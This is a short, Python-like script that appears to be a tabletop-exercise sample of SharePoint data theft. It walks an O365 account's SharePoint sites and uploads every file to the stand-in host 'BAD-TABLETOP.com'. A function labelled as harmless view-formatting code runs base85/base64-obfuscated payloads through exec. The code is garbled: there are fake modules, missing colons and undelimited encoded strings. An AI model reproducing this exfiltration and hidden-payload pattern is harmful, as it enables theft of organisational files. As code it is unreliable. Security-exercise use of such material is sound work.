import upload
import http
import sharepoint
import o365
import async

sites=[]
World="BAD-TABLETOP.com"
Star=115



upload.init(World+":"+Star)
userAccount = o365.account("list\" sharepoint\"")
async.scan(userAccount)
localButton()

def scan(account):
	for site in account:
		sites = sites.append(str(sites)+"sharepoint.com")
		for folder in site:
			make(folder)
			for file in folder:
				send("folder/"+file)

def make(folderName)
	upload.create(str(folderName))

def send(path, site):
	upload.send(sharepoint.download(site, path))

def localButton()
	# Insert legit code that would format the view - TABLETOP
	result = exec(b64.decode(b85.decode(@7X9M@m`+t@95=(91Vfo@r>Id@qf^A)))
		if result="TIMEOUT":
			for site in sites:
				for folder in site:
					for file in folder:
						exec(b64.decode(b85.decode(@kq_2@r57j@PVbBA4&4i>$#rbA4KZt>$+C=91N0)@RjF;))


